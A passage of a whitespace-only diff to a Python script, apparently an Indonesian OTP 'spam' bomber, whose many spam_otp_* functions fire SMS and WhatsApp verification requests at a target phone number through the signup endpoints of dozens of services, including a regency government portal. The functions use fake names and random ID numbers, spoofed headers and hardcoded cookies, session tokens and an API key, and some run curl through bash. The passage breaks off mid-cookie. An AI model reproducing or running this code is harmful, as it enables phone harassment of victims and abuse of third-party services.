@@ -3166,7 +3168,7 @@ def spam_otp_naturalfarm(nomor):
             'Referer': 'https://www.naturalfarm.id/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             'first_name': first_name,
             'last_name': last_name,
@@ -3185,10 +3187,10 @@ def spam_otp_naturalfarm(nomor):
             'referral_code': '',
             'card_code': None
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3207,7 +3209,7 @@ def spam_otp_gritero(nomor):
         email = f"{user}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"
 
         url = 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id'
-        
+
         headers = {
             'accept': '*/*',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -3220,16 +3222,16 @@ def spam_otp_gritero(nomor):
             'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
             'xid': '2995761938'
         }
-        
+
         payload = {
             'nama_lengkap': nama,
             'email': email,
             'telepon': nomor_lokal
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3243,19 +3245,19 @@ def spam_otp_toss(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
         import random
-        
+
         nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
         token = "0LCXtW6VhWNOQviT5Oymo2xj1JQp5meEhaF2AhBq"
-        
+
         curl_cmd = f"""curl -s -X POST 'https://toss.tubankab.go.id/register/otp/act' \\
   -H 'host: toss.tubankab.go.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -3275,9 +3277,9 @@ def spam_otp_toss(nomor):
   -H 'cookie: _ga=GA1.1.186516799.1783490717; _ga_QEWBPVNKLP=GS2.1.s1783490717$o1$g1$t1783490775$j2$l0$h0; _ga_LKLNRLDY51=GS2.1.s1783490717$o1$g1$t1783490775$j2$l0$h0; _ga_T5R13XZX0L=GS2.1.s1783490718$o1$g1$t1783490775$j3$l0$h0; XSRF-TOKEN=eyJpdiI6IjhWYUZzM0xQeDhXT3dGQmNkem5pUFE9PSIsInZhbHVlIjoic3Y2UGJBZG1wQklPb1JHN2lTNGtWbWFBSENaSUxIOHIzT2Uzb3VQeTBkZ3ZNNStsVmNpczlRMWcvTFJxdGdLcUNLMWJqTlBocE5OcnFxdE9XMUVsUzg4Q0xHUlZxejRoUUwzMEhUUUlEVU9BSTgzL3VPbUhVTFVuQlg1bDgwMEsiLCJtYWMiOiJlZjlmNDBmMDlmNzlmM2JiYjAxNmI4NWQ5ZDc5MTJjNTkyNDA1YWU1ZmI3M2E3ZjM1NWQ3NDQ0NTc3NjlmYWRhIiwidGFnIjoiIn0%3D; toss_session=eyJpdiI6InRsZHQyL093OEtqTlVENlVkUjZTUWc9PSIsInZhbHVlIjoiRXpsb2diL1d1L0Exa01wbkNWSytvY1dXNU41SExyakZSS2hEVEpnclpkeml4UlcxMmlkVjQrOG9lQ2JpY3drREwyc24vTUdVb1daMDdwWXczdCtxMFVndmkrM3dWV2w2ZXV6SHBJZStUcGdjUG5CbkEwTU0wUmI4Z3d5eFJWekUiLCJtYWMiOiI0MDYwZTI1YzIzMWZlNDJmYjNmZTc3Y2U5OTc0MmQ2OWE1MzIzOGUyYWQ2MDI0YjM0MTdjZDg5YjJjYmU0ZTYxIiwidGFnIjoiIn0%3D' \\
   -H 'priority: u=1, i' \\
   --data-raw 'nik={nik}&nohp={phone}&_token={token}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -3289,7 +3291,7 @@ def spam_otp_toss(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -3303,14 +3305,14 @@ def spam_otp_topindosms(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         import uuid
         import time
-        
+
         uuid_device = str(uuid.uuid4())
-        
+
         url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'
-        
+
         headers = {
             'Host': 'mobileapps.topindoku.co.id',
             'sec-ch-ua-platform': '"Android"',
@@ -3324,7 +3326,7 @@ def spam_otp_topindosms(nomor):
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
         }
-        
+
         payload = {
             "phone": phone,
             "via": "SMS",
@@ -3333,10 +3335,10 @@ def spam_otp_topindosms(nomor):
             "fbp": "fb.2.1784860943418.959857478235602163",
             "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3353,9 +3355,9 @@ def spam_otp_toss2(nomor):
 
         session = requests.Session()
         headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
-        
+
         resp = session.get('https://toss.tubankab.go.id/register', headers=headers)
-        
+
         import re
         match = re.search("'_token':\\s*'([^']+)'", resp.text)
         if match:
@@ -3374,7 +3376,7 @@ def spam_otp_toss2(nomor):
             return resp2.status_code < 400
         else:
             return False
-            
+
     except Exception as e:
         return False
 
@@ -3396,7 +3398,7 @@ def spam_otp_farmaklik(nomor):
         password = 'Yanto1234'
 
         session = requests.Session()
-        
+
         # Step 1: Register
         url_reg = 'https://farmaklik-pos-api-main-784468809835.asia-southeast1.run.app/auth/register'
         r1 = session.post(url_reg, 
@@ -3410,11 +3412,11 @@ def spam_otp_farmaklik(nomor):
             headers={'Content-Type': 'application/json'},
             timeout=10
         )
-        
+
         custom_token = r1.json().get('token')
         if not custom_token:
             return False
-            
+
         # Step 2: Sign in with custom token
         url_sign = 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyDip_k5QiYuEVeuvevdVsT3Z7wC4CKUqNo'
         r2 = requests.post(url_sign,
@@ -3422,11 +3424,11 @@ def spam_otp_farmaklik(nomor):
             headers={'Content-Type': 'application/json'},
             timeout=10
         )
-        
+
         id_token = r2.json().get('idToken')
         if not id_token:
             return False
-            
+
         # Step 3: Request OTP
         url_otp = 'https://farmaklik-pos-api-main-784468809835.asia-southeast1.run.app/auth/otp-request'
         r3 = session.post(url_otp,
@@ -3437,9 +3439,9 @@ def spam_otp_farmaklik(nomor):
             },
             timeout=10
         )
-        
+
         return r3.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3533,10 +3535,10 @@ def spam_otp_eci_signup(nomor):
             'identity': nomor_lokal,
             'with': 'whatsapp'
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3573,10 +3575,10 @@ def spam_otp_eci(nomor):
             'identity': nomor_lokal,
             'with': 'sms'
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3594,7 +3596,7 @@ def spam_otp_qoalaplus(nomor):
 
         session = requests.Session()
         url = 'https://api.qoalaplus.com/agent/v2/user/generate-otp'
-        
+
         headers = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
             'Accept': 'application/json, text/plain, */*',
@@ -3617,13 +3619,13 @@ def spam_otp_qoalaplus(nomor):
             'usecase': 'REGISTRATION',
             'data': f'+{nomor_lokal}'
         }
-        
+
         resp = session.patch(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_singa_yoi(nomor):
     try:
         if nomor.startswith('0'):
@@ -3641,7 +3643,7 @@ def spam_otp_singa_yoi(nomor):
     except:
         return False
 
-        
+
 def spam_otp_uangme(nomor):
     try:
         if nomor.startswith('0'):
@@ -3652,22 +3654,22 @@ def spam_otp_uangme(nomor):
             nomor = nomor[3:]
         else:
             nomor = nomor
-        
+
         import time
         import random
         import uuid
-        
+
         gaid = f"gaid_{str(uuid.uuid4())}"
         android_id = ''.join(random.choices('0123456789abcdef', k=16))
-        
+
         url = 'https://api.uangme.com/api/v2/sms_code'
-        
+
         params = {
             'phone': nomor,
             'scene_type': 'login',
             'send_type': 'wp'
         }
-        
+
         headers = {
             'country': '510',
             'os': '1',
@@ -3691,9 +3693,9 @@ def spam_otp_uangme(nomor):
             'Accept-Encoding': 'gzip',
             'User-Agent': 'okhttp/3.12.1'
         }
-        
+
         resp = requests.get(url, params=params, headers=headers, timeout=10)
-        
+
         if resp.status_code == 200:
             try:
                 data = resp.json()
@@ -3701,7 +3703,7 @@ def spam_otp_uangme(nomor):
             except:
                 return 'success' in resp.text.lower()
         return False
-        
+
     except Exception as e:
         return False
 
@@ -3733,20 +3735,20 @@ def spam_otp_fastwork(nomor):
             phone = '0' + nomor
 
         url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
-        
+
         headers = {
             "Content-Type": "application/json",
             "Origin": "https://fastwork.id",
             "Referer": "https://fastwork.id/",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
         }
-        
+
         payload = {
             "phone_number": phone,
             "country_code": "62",
             "type": "whatsapp"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code == 200
     except:
@@ -3788,9 +3790,9 @@ def spam_otp_mapclub_wa(nomor):
             nomor = nomor[2:]
         elif nomor.startswith('+62'):
             nomor = nomor[3:]
-        
+
         token = 'eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJhZmFkMTJlMS04ODk0LTQyOTMtOThkMy1iYmM5M2Y4N2ExZDAiLCJleHBpcmVkIjoxNzgyOTc2NDIxNzE1LCJleHBpcmUiOjM2MDAsImV4cCI6MTc4Mjk3NjQyMSwiaWF0IjoxNzgyOTcyODIxLCJwbGF0Zm9ybSI6IldFQiJ9.1-V0QBbQsXsOxrg7gwaoKzsN-WJIrzb4Qao64pxz50thAZ1m6byXeSbmRjerAkMdMzgdVH7NSknlwfyAXFbB9g'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'in-ID',
@@ -3805,21 +3807,21 @@ def spam_otp_mapclub_wa(nomor):
             'sec-ch-ua-platform': '"Android"',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "account": nomor,
             "prefix": "62"
         }
-        
+
         url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp'
         params = {'channel': 'WHATSAPP'}
-        
+
         response = requests.post(url, headers=headers, json=payload, params=params, timeout=15)
         return response.status_code == 200
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_watsons(nomor):
     try:
         if nomor.startswith('0'):
@@ -3828,9 +3830,9 @@ def spam_otp_watsons(nomor):
             nomor = nomor[2:]
         elif nomor.startswith('+62'):
             nomor = nomor[3:]
-        
+
         session = requests.Session()
-        
+
         headers = {
             'Host': 'api.watsons.co.id',
             'Connection': 'keep-alive',
@@ -3855,7 +3857,7 @@ def spam_otp_watsons(nomor):
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
             'priority': 'u=1, i'
         }
-        
+
         otp_payload = {
             "uid": "",
             "action": "GENERAL",
@@ -3863,11 +3865,11 @@ def spam_otp_watsons(nomor):
             "target": nomor,
             "type": "WHATSAPP"
         }
-        
+
         otp_url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'
-        
+
         resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=15)
-        
+
         if resp_otp.status_code == 200:
             try:
                 data = resp_otp.json()
@@ -3881,10 +3883,10 @@ def spam_otp_watsons(nomor):
                 return True
         else:
             return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_watsons_kedua(nomor):
     try:
         if nomor.startswith('0'):
@@ -3893,9 +3895,9 @@ def spam_otp_watsons_kedua(nomor):
             nomor = nomor[2:]
         elif nomor.startswith('+62'):
             nomor = nomor[3:]
-        
+
         session = requests.Session()
-        
+
         headers = {
             'Host': 'api.watsons.co.id',
             'Connection': 'keep-alive',
@@ -3920,7 +3922,7 @@ def spam_otp_watsons_kedua(nomor):
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
             'priority': 'u=1, i'
         }
-        
+
         otp_payload = {
             "uid": "",
             "action": "REGISTRATION",
@@ -3928,11 +3930,11 @@ def spam_otp_watsons_kedua(nomor):
             "target": nomor,
             "type": "SMS"
         }
-        
+
         otp_url = 'https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR'
-        
+
         resp_otp = session.post(otp_url, json=otp_payload, headers=headers, timeout=15)
-        
+
         if resp_otp.status_code == 200:
             try:
                 data = resp_otp.json()
@@ -3946,10 +3948,10 @@ def spam_otp_watsons_kedua(nomor):
                 return True
         else:
             return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_mapclub_wa_kedua(nomor):
     try:
         if nomor.startswith('0'):
@@ -3960,11 +3962,11 @@ def spam_otp_mapclub_wa_kedua(nomor):
             nomor = nomor[3:]
         else:
             nomor = nomor
-        
+
         token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"
-        
+
         url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'in-ID',
@@ -3979,15 +3981,15 @@ def spam_otp_mapclub_wa_kedua(nomor):
             'sec-ch-ua-platform': '"Android"',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "account": nomor,
             "prefix": "62"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code == 200
-        
+
     except Exception as e:
         return False
 
@@ -3999,9 +4001,9 @@ def spam_otp_mapclub_sms(nomor):
             nomor = nomor[2:]
         elif nomor.startswith('+62'):
             nomor = nomor[3:]
-        
+
         token = 'eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJhZmFkMTJlMS04ODk0LTQyOTMtOThkMy1iYmM5M2Y4N2ExZDAiLCJleHBpcmVkIjoxNzgyOTc2NDIxNzE1LCJleHBpcmUiOjM2MDAsImV4cCI6MTc4Mjk3NjQyMSwiaWF0IjoxNzgyOTcyODIxLCJwbGF0Zm9ybSI6IldFQiJ9.1-V0QBbQsXsOxrg7gwaoKzsN-WJIrzb4Qao64pxz50thAZ1m6byXeSbmRjerAkMdMzgdVH7NSknlwfyAXFbB9g'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'in-ID',
@@ -4021,16 +4023,16 @@ def spam_otp_mapclub_sms(nomor):
             "account": nomor,
             "prefix": "62"
         }
-        
+
         url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp'
         params = {'channel': 'SMS'}
-        
+
         response = requests.post(url, headers=headers, json=payload, params=params, timeout=15)
         return response.status_code == 200
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_mapclub_sms_kedua(nomor):
     try:
         if nomor.startswith('0'):
@@ -4041,11 +4043,11 @@ def spam_otp_mapclub_sms_kedua(nomor):
             nomor = nomor[3:]
         else:
             nomor = nomor
-        
+
         token = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIwMWQ3MmY3Yi1mMTY2LTRmM2YtOWZhYi1hMGViNGQ2MjE5YTIiLCJleHBpcmVkIjoxNzgzNTM3MTA4MDMzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MzUzNzEwOCwiaWF0IjoxNzgzNTMzNTA4LCJwbGF0Zm9ybSI6IldFQiJ9.AEe4pFBbLiTtQkCBoc4NgFiyzxJmqVs-YjNp0HkW6Xbi14oOo_lRZGOojeF9nngJm6CwmvvGPtTZ34jZxyqzCg"
-        
+
         url = 'https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'in-ID',
@@ -4060,15 +4062,15 @@ def spam_otp_mapclub_sms_kedua(nomor):
             'sec-ch-ua-platform': '"Android"',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "account": nomor,
             "prefix": "62"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code == 200
-        
+
     except Exception as e:
         return False
 
@@ -4082,12 +4084,12 @@ def spam_otp_ruparupa(nomor):
             nomor = nomor
         else:
             nomor = '62' + nomor
-        
+
         # Generate rr-sid
         rr_sid = f"ufiO{int(time.time())}XymEEjG06H"
-        
+
         url = 'https://wapi.ruparupa.com/klk/manage-otp-request'
-        
+
         headers = {
             'accept': 'application/json',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -4111,17 +4113,17 @@ def spam_otp_ruparupa(nomor):
             'x-company-name': 'ruparupa',
             'x-frontend-type': 'desktop'
         }
-        
+
         payload = {
             "otpRequestType": "verify-phone",
             "action": "onMountOrResend",
             "channel": "WhatsApp",
             "phone": nomor
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code == 200
-        
+
     except Exception as e:
         return False
 
@@ -4135,12 +4137,12 @@ def spam_otp_cashenable(nomor):
             nomor = nomor
         else:
             nomor = '+62' + nomor
-        
+
         import uuid
         device_id = str(uuid.uuid4())
-        
+
         url = 'https://api.cashenable.com/authentication/v2/coreauth'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -4163,22 +4165,22 @@ def spam_otp_cashenable(nomor):
             'source': 'Desktop',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
         }
-        
+
         payload = {
             "identifier": nomor,
             "auth_method": "whatsapp"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code == 201
-        
+
     except Exception as e:
         return False
 
 def spam_eraspace(phone):
     try:
         import hashlib
-        
+
         p = normalize_phone(phone)
         if p.startswith('0'):
             msisdn = '62' + p[1:]
@@ -4189,12 +4191,12 @@ def spam_eraspace(phone):
 
         device_id = str(uuid.uuid4())
         epoch = str(int(time.time()))
-        
+
         SHA256(device_id|eraspace|epoch)
         signature = hashlib.sha256(f"{device_id}|eraspace|{epoch}".encode()).hexdigest()
 
         url = "https://jeanne.eraspace.com/customers/v3/otp/request"
-        
+
         headers = {
             "Accept": "application/json, text/plain, */*",
             "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -4213,15 +4215,15 @@ def spam_eraspace(phone):
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
             "Connection": "keep-alive"
         }
-        
+
         payload = {
             "identifier": msisdn,
             "regionCode": "ID",
             "type": "identifier_validation"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        
+
         if 200 <= resp.status_code <= 299:
             try:
                 data = resp.json()
@@ -4235,7 +4237,7 @@ def spam_eraspace(phone):
         return False
     except:
         return False
-        
+
 def spam_otp_oyorooms(nomor):
     try:
         if nomor.startswith('0'):
@@ -4244,14 +4246,14 @@ def spam_otp_oyorooms(nomor):
             nomor = nomor[3:]
         elif nomor.startswith('62'):
             nomor = nomor[2:]
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
-        
+
         if len(nomor) < 10:
             return False
-        
+
         session = requests.Session()
-        
+
         cookies = {
             'delta_ver': '1783169391.895.680.781361|30a98be7397e93d8ee905a77f63b5c5a',
             '_csrf': 'z2qem89SAImhv-99mY7Qz43S',
@@ -4271,13 +4273,13 @@ def spam_otp_oyorooms(nomor):
             '_ga': 'GA1.2.301009132.1783169392',
             '_gid': 'GA1.2.1435061004.1783169397'
         }
-        
+
         session.cookies.update(cookies)
-        
+
         fingerprint = "a19e43fe531de889917ff09bd9c00e3b"
         device_id = fingerprint + "530311"
         sdata = "eyJrdWQiOlsyNDIwMCwxNDUwMCwxMjcwMCwxOTUwMCwxMzkwMCwxNDAwMCwxNDUwMCwxNzAwMCwxMzcwMCwxMzAwMCwxMTkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6WzE2MDAsMzAyMDAsNDQ5MDAsNDE1NzAwLDMxMTUwMCwyOTY4MDAsMzQ1NDAwLDM5NTcwMCwyOTYyMDAsMjEzODAwLDk2NTAwLDk3NjAwLDExMjEwMCwxNzkyMDAsMTE0NjAwLDE0NjcwMCw5NjQwMCwzMjY0MDAsMzQ0NjAwLDMyODQwMCwzMjgwMDAsMzYwNzAwLDUxMTMwMCw2NDQ0MDAsMzEzNzAwLDI4NzAwLDYxNjAwLDk1MzAwXSwidGlkIjpbNTYzMTAwMCwxNzM2MDIwMCw2MTk4MTAwLDExMzQwMDAsMzA0MjAwLDIwMTkwMCwyMjA5MDAsMjIwNTAwLDE4NjcwMCwxNjkwMDAsNTY4ODAwLDcwMjMwMCw5Njk5MDAsMjg3MDAwLDUzNTAwMCw3MTg3MDAsNjAyODAwLDEyMjE2MDAsMTcxMTAwLDIwNjEwMCwyMjA0MDAsMTg4MzAwLDE3MTMwMCw2NTYwMDAsMzM1NzAwLDM4NjgwMCw4MDIyNzgwMCwxMTc5MzQwMF0sImtpZCI6WzEyNzM5MTEwMCwxOTM1MDAsMjMyMTAwLDIyMjUwMCwyNDU5MDAsMjY5MzAwLDE1MjMwMCwyMzQ2MDAsMTY2NjAwLDIwNDEwMCwxODYyMDBdLCJ0bXYiOltbeyJ4IjoyNDcsInkiOjM2OX0seyJ4IjoyNTUsInkiOjM0Mn0seyJ4IjozMjcsInkiOjE4OX0seyJ4IjozMzUsInkiOjE3Nn1dLFt7IngiOjI1NSwieSI6MzYyfSx7IngiOjI1OSwieSI6MzU0fSx7IngiOjM0NywieSI6MTc4fSx7IngiOjM1MSwieSI6MTcyfV0sW3sieCI6MjQwLCJ5Ijo1MTZ9LHsieCI6MjM4LCJ5Ijo1MjZ9LHsieCI6MjM3LCJ5Ijo1Mzh9LHsieCI6MjM3LCJ5Ijo1NDB9LHsieCI6MjM3LCJ5Ijo1Mzl9XSxbeyJ4IjoyNTUsInkiOjM1MX0seyJ4IjoyNTMsInkiOjM1OX0seyJ4IjoyMzUsInkiOjUwMH0seyJ4IjoyMzUsInkiOjUyNX0seyJ4IjoyMzUsInkiOjUzN31dLFt7IngiOjIwMCwieSI6MzIxfSx7IngiOjIwNSwieSI6MzA3fSx7IngiOjIyMywieSI6MjU2fSx7IngiOjIyMywieSI6MjU2fV1dfQ=="
-        
+
         headers = {
             'accept': '*/*',
             'accept-language': 'id',
@@ -4293,25 +4295,25 @@ def spam_otp_oyorooms(nomor):
             'externalHeaders': '[object Object]',
             'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw'
         }
-        
+
         payload = {
             "phone": nomor,
             "country_code": "+62",
             "nod": 4
         }
-        
+
         r = session.post('https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=id',
             json=payload,
             headers=headers,
             timeout=10
         )
-        
+
         if r.status_code == 200:
             try:
                 data = r.json()
                 status = data.get('status', '')
                 is_user_present = data.get('is_user_present', False)
-                
+
                 if status == "correct" and is_user_present:
                     return True
                 elif status == "correct" and not is_user_present:
@@ -4322,10 +4324,10 @@ def spam_otp_oyorooms(nomor):
                 return True if r.status_code == 200 else False
         else:
             return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_speedcash_sms(nomor):
     try:
         if nomor.startswith('0'):
@@ -4382,23 +4384,23 @@ def spam_otp_speedcash_sms(nomor):
 
     except Exception as e:
         return False
-        
+
 def spam_otp_kitabisa_wea(nomor):
     try:
         if nomor.startswith('0'):
             nomor = '62' + nomor[1:]
         elif nomor.startswith('+62'):
             nomor = nomor[1:]
-        
+
         import subprocess
         import json
-        
+
         payload = json.dumps({
             "full_name": "Fahri reza",
             "username": nomor,
             "otp_type": "whatsapp"
         })
-        
+
         curl_command = f'''curl -s -X POST 'https://gate.kitabisa.com/wong/register/draft' \\
   -H 'accept: application/json' \\
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
@@ -4421,9 +4423,9 @@ def spam_otp_kitabisa_wea(nomor):
   -H 'x-ktbs-signature: cf6bb271fda15fb3083a336e71b27db7d3e6b410a2026d7e377f1cd5cdb83645' \\
   -H 'x-ktbs-time: 1782837706' \\
   -d '{payload}' '''
-        
+
         result = subprocess.run(['bash', '-c', curl_command], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4431,7 +4433,7 @@ def spam_otp_kitabisa_wea(nomor):
             except:
                 return False
         return False
-        
+
     except Exception as e:
         return False
 
@@ -4445,9 +4447,9 @@ def spam_otp_auto2000(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         url = 'https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp'
-        
+
         headers = {
             'Host': 'auto2000.co.id',
             'sec-ch-ua-platform': '"Android"',
@@ -4464,17 +4466,17 @@ def spam_otp_auto2000(nomor):
             'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
             'Cookie': 'UU_PDP_CHECKBOX_CONTENT=PHA+U2F5YSBzZXR1anUgdW50dWsgbWVuZXJpbWEgcHJvZ3JhbSBwcm9tb3NpIGRhbiBsYXlhbmFuIGRhcmkgQXV0bzIwMDAgc2VzdWFpIGRlbmdhbiA8c3BhbiBzdHlsZT0iY29sb3I6cmdiKDAsIDEwMiwgMjA0KSI+PHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj48L3NwYW4+PHNwYW4+IGRhbiA8L3NwYW4+PHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4geWFuZyBiZXJsYWt1LjwvcD4%3D; UU_PDP_POPUP_CONTENT=PHA+PHN0cm9uZz5TYWxhbSBBdXRvRmFtaWx5IEJhcGFrL0lidSB7Y3VzdG9tZXJOYW1lfSE8L3N0cm9uZz48L3A+PHA+PGJyIC8+PC9wPjxwPlRlcmltYSBrYXNpaCB0ZWxhaCBtZW1pbGloIEF1dG8yMDAwLiBLbGlrIOKAnFNldHVqdeKAnSB1bnR1ayBwZW5nYWxhbWFuIG9wdGltYWwgJmFtcDsgcGVyc29uYWxpc2FzaSBsYXlhbmFuIHNlc3VhaSBkZW5nYW4gPHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj4gJmFtcDsgPHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4uPC9wPg%3D%3D; __gcl_au=1.1.1768235826.1784098499; _ga=GA1.1.195703634.1784098502; _fbp=fb.2.1784098503407.212865537130129769; _tt_enable_cookie=1; _ttp=01KXJ8XFB6NA5CZT43HK9H4DC3_.tt.2; 